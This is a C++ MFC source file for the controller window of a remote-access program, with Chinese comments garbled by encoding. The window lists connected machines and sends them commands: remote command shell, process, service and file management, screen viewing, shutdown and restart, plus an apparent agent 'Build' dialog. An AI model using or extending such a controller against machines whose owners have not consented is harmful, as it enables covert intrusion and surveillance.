// RemoteClientView.cpp : CRemoteClientView ���ʵ��
//

#include "stdafx.h"
#include "RemoteClient.h"

#include "RemoteClientDoc.h"
#include "RemoteClientView.h"
#include "Build.h"
#include "SysSettingPort.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CRemoteClientView

IMPLEMENT_DYNCREATE(CRemoteClientView, CListView)

BEGIN_MESSAGE_MAP(CRemoteClientView, CListView)
	ON_WM_SIZE()
	ON_MESSAGE(WM_ONLINE, &CRemoteClientView::MyOnLine)
	ON_MESSAGE(WM_OFFLINE,&CRemoteClientView::MyOffLine)
	ON_NOTIFY_REFLECT(NM_RCLICK, &CRemoteClientView::OnNMRClick)
	ON_COMMAND(ID_CTRL_EXIT, &CRemoteClientView::OnCtrlExit)
	ON_COMMAND(ID_CTRL_PROCESS, &CRemoteClientView::OnCtrlProcess)
	ON_COMMAND(ID_CTRL_CMD, &CRemoteClientView::OnCtrlCmd)
	ON_COMMAND(ID_LOGOUT, &CRemoteClientView::OnLogout)
	ON_COMMAND(ID_RESTART, &CRemoteClientView::OnRestart)
	ON_COMMAND(ID_SHUTDOWN, &CRemoteClientView::OnShutdown)
	ON_COMMAND(ID_CTRL_SVCMANAGE, &CRemoteClientView::OnCtrlSvcmanage)
	ON_COMMAND(ID_CTRL_FILE, &CRemoteClientView::OnCtrlFile)
	ON_COMMAND(ID_CTRL_SCREEN, &CRemoteClientView::OnCtrlScreen)
	ON_COMMAND(ID_BUILD, &CRemoteClientView::OnBuild)
	ON_COMMAND(ID_SETPORT, &CRemoteClientView::OnSetport)
END_MESSAGE_MAP()

// CRemoteClientView ����/����

CRemoteClientView::CRemoteClientView()
{
	// TODO: �ڴ˴���ӹ������
	m_Process = NULL;
	m_CmdShell = NULL;
	m_SvcManage = NULL;
	m_FileManage = NULL;
	m_ScreenManage = NULL;
}

CRemoteClientView::~CRemoteClientView()
{
}

BOOL CRemoteClientView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: �ڴ˴�ͨ���޸�
	//  CREATESTRUCT cs ���޸Ĵ��������ʽ

	return CListView::PreCreateWindow(cs);
}

void CRemoteClientView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();
	// TODO: ���� GetListCtrl() ֱ�ӷ��� ListView ���б�ؼ���
	//  �Ӷ������������ ListView��
	//���沿�֣���ʾ�б�ؼ�
	LONG Gstyle = GetWindowLong(GetListCtrl().m_hWnd, GWL_STYLE);
	SetWindowLong(GetListCtrl().m_hWnd, GWL_STYLE, Gstyle|LVS_REPORT);
	GetListCtrl().SetExtendedStyle(LVS_EX_GRIDLINES|LVS_EX_FULLROWSELECT);

	GetListCtrl().InsertColumn(0, _T("IP"), 0, 140, -1);
	GetListCtrl().InsertColumn(1, _T("���������"), 0, 140, -1);
	GetListCtrl().InsertColumn(2, _T("����ϵͳ"), 0, 140, -1);
	GetListCtrl().InsertColumn(3, _T("�ڴ��С"), 0, 140, -1);
	m_ImageList.Create(24, 24, ILC_COLOR32, 10, 20);

	wchar_t bmpPath[MAX_PATH] = {0};
	GetCurrentDirectory(MAX_PATH, bmpPath);
	lstrcatW(bmpPath, _T("\\����ͼƬ.bmp"));
	m_some.FreeBMP(MAKEINTRESOURCE(IDB_BITMAP), MAKEINTRESOURCE(RT_BITMAP), bmpPath);
	SetFileAttributes(bmpPath, FILE_ATTRIBUTE_NORMAL);
	GetListCtrl().SetBkImage(bmpPath);
	//GetListCtrl().SetTextBkColor(RGB(255,,0));

	MyInitWindow();
	SkinH_Attach();
	//�����߳�
	AfxBeginThread(m_clientsock.MyControllingFuction, this);

	CFileSock m_fsock;
	m_fsock.MyFSockStart();
}


// CRemoteClientView ���

#ifdef _DEBUG
void CRemoteClientView::AssertValid() const
{
	CListView::AssertValid();
}

void CRemoteClientView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CRemoteClientDoc* CRemoteClientView::GetDocument() const // �ǵ��԰汾��������
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CRemoteClientDoc)));
	return (CRemoteClientDoc*)m_pDocument;
}
#endif //_DEBUG


// CRemoteClientView ��Ϣ�������

void CRemoteClientView::MyInitWindow(void)
{
	m_StatusBarCtrl.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM|SBARS_SIZEGRIP, CRect(0, 0, 0, 0), this, IDC_STATUSBARCTRL);
	const int c_nParts = 4;
	CRect rect;
	m_StatusBarCtrl.GetClientRect(&rect);
	int aWidths[c_nParts] = {rect.left + 225, rect.right - 260, rect.right - 140, -1};
	m_StatusBarCtrl.SetParts(c_nParts, aWidths);
	MyGetTime();
	//m_StatusBarCtrl.SetText(_T("����ʱ���ǣ�"), 0, SBT_POPOUT);
	m_StatusBarCtrl.SetText(_T("��ϵ��ʽ��182****9687"), 1, SBT_POPOUT);
	m_StatusBarCtrl.SetText(_T("�����˿ڣ�6789"),2,SBT_POPOUT);
	//m_StatusBarCtrl.SetText(_T("����������0"), 3, SBT_POPOUT);

	HICON ico_cmp = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_CMP));
	//int cmp = m_ImageList.Add(ico_cmp);
	m_StatusBarCtrl.SetIcon(3, ico_cmp);
}

void CRemoteClientView::MyGetTime(void)
{

	CTime t = CTime::GetCurrentTime();
	CString temp;
	temp.Format(_T("���ڵ�ʱ���ǣ�%d��%d��%d��%d:%d:%d"), t.GetYear(), t.GetMonth(), t.GetDay(), t.GetHour(), t.GetMinute(), t.GetSecond());
	m_StatusBarCtrl.SetText(temp, 0, SBT_POPOUT);

	CString portemp;
	portemp.Format(_T("�����˿ڣ�%d"), m_MyPort);
	m_StatusBarCtrl.SetText(portemp, 2, SBT_POPOUT);

	int idx = m_ServArray.GetCount();
	CString tem;
	tem.Format(_T("��������:%d̨"), idx);
	m_StatusBarCtrl.SetText(tem, 3, SBT_POPOUT);
}

void CRemoteClientView::OnSize(UINT nType, int cx, int cy)
{
	CListView::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	//�����˴�����󻯣��˴�������Ч
	CWnd *pWnd = GetDlgItem(IDC_STATUSBARCTRL);
	if (pWnd)
	{
		CRect det, sdt;
		GetClientRect(&det);
		pWnd->GetClientRect(&sdt);
		sdt.right = det.right;
		sdt.top = det.bottom - sdt.Height();
		pWnd->MoveWindow(sdt);
	}
}

LRESULT CRemoteClientView::MyOnLine(WPARAM wp, LPARAM lp)
{
	ServItem sitem = *(ServItem*)wp;
	int idx = (int)lp;

	GetListCtrl().InsertItem(idx, sitem.ip);
	GetListCtrl().SetItemText(idx, 1, sitem.cmpname);
	GetListCtrl().SetItemText(idx,2,m_some.MyGetOS(sitem.os));
	CString ms;
	ms.Format(_T("%d"),sitem.memsize);
	GetListCtrl().SetItemText(idx,3,ms);
	return 0;
}

LRESULT CRemoteClientView::MyOffLine(WPARAM wp,LPARAM lp)
{
	int idx = (int)lp;
	GetListCtrl().DeleteItem(idx);
	m_ServArray.RemoveAt(idx);
	if (m_Process != NULL)
	{
		m_Process->OnCancel();
	}
	if (m_CmdShell != NULL)
	{
		m_CmdShell->OnCancel();
	}
	if (m_SvcManage != NULL)
	{
		m_SvcManage->OnCancel();
	}
	if (m_FileManage != NULL)
	{
		m_FileManage->OnCancel();
	}
	if (m_ScreenManage != NULL)
	{
		m_ScreenManage->OnCancel();
	}
	return 0;
}


void CRemoteClientView::OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	int idx = pNMItemActivate->iItem;
	if (idx < 0)
	{
		return ;
	}
	//m_ServArray.GetAt(idx).sk;
	CMenu menu, *pMenu = NULL;
	menu.LoadMenu(IDR_MEN_CTRL);
	pMenu = menu.GetSubMenu(0);
	CPoint pt;
	GetCursorPos(&pt);

	pMenu->TrackPopupMenu(TPM_LEFTALIGN|TPM_TOPALIGN|TPM_RIGHTBUTTON, pt.x, pt.y, this);
	*pResult = 0;
}

void CRemoteClientView::OnCtrlExit()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	
	m_clientsock.MySendCommond(m_ServArray.GetAt(idx).sk, MYEXITPROCESS, NULL, 0);
}

void CRemoteClientView::OnCtrlProcess()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	if(m_Process == NULL)
	{
		m_Process = new CProcess(this,  m_ServArray.GetAt(idx).sk);
		m_Process->Create(IDD_PROCESS, this);
		m_Process->ShowWindow(SW_SHOW);
	}
	else
	{
		m_Process->ShowWindow(SW_SHOW);
	}
}

void CRemoteClientView::OnCtrlCmd()
{
	// TODO: �ڴ���������������
	
	int idx = GetListCtrl().GetSelectionMark();
	if(m_CmdShell == NULL)
	{
		m_CmdShell = new CCmdShell(this,  m_ServArray.GetAt(idx).sk);
		m_CmdShell->Create(IDD_CMDSHELL, this);
		m_CmdShell->ShowWindow(SW_SHOW);
	}
	else
	{
		m_CmdShell->ShowWindow(SW_SHOW);
	}
}

//ע��
void CRemoteClientView::OnLogout()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	m_clientsock.MySendCommond(m_ServArray.GetAt(idx).sk, MYGETPROCESS, NULL, 0, MYLOGOUT);
}

//����
void CRemoteClientView::OnRestart()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	m_clientsock.MySendCommond(m_ServArray.GetAt(idx).sk, MYGETPROCESS, NULL, 0, MYRESTART);
}

//�ػ�
void CRemoteClientView::OnShutdown()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	m_clientsock.MySendCommond(m_ServArray.GetAt(idx).sk, MYGETPROCESS, NULL, 0, MYSHUTDOWN);
}

void CRemoteClientView::OnCtrlSvcmanage()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	if(m_SvcManage == NULL)
	{
		m_SvcManage = new CSvcManage(this,  m_ServArray.GetAt(idx).sk);
		m_SvcManage->Create(IDD_SVNMANAGE, this);
		m_SvcManage->ShowWindow(SW_SHOW);
	}
	else
	{
		m_SvcManage->ShowWindow(SW_SHOW);
	}
}

void CRemoteClientView::OnCtrlFile()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	if(m_FileManage == NULL)
	{
		m_FileManage = new CFileManage(this,  m_ServArray.GetAt(idx).sk);
		m_FileManage->Create(IDD_FILEMANEGE, this);
		m_FileManage->ShowWindow(SW_SHOW);
	}
	else
	{
		m_FileManage->ShowWindow(SW_SHOW);
	}
}

void CRemoteClientView::OnCtrlScreen()
{
	// TODO: �ڴ���������������
	int idx = GetListCtrl().GetSelectionMark();
	if(m_ScreenManage == NULL)
	{
		m_ScreenManage = new CScreemManage(this,  m_ServArray.GetAt(idx).sk);
		m_ScreenManage->Create(IDD_SCREEM, this);
		m_ScreenManage->ShowWindow(SW_SHOW);
	}
	else
	{
		m_ScreenManage->ShowWindow(SW_SHOW);
	}
}

void CRemoteClientView::OnBuild()
{
	// TODO: �ڴ���������������
	CBuild dlg;
	if (dlg.DoModal() != IDOK)
	{
		return ;
	}
}

void CRemoteClientView::OnSetport()
{
	// TODO: �ڴ���������������
	CSysSettingPort dlg;
	if (dlg.DoModal() != IDOK)
	{
		return ;
	}

}
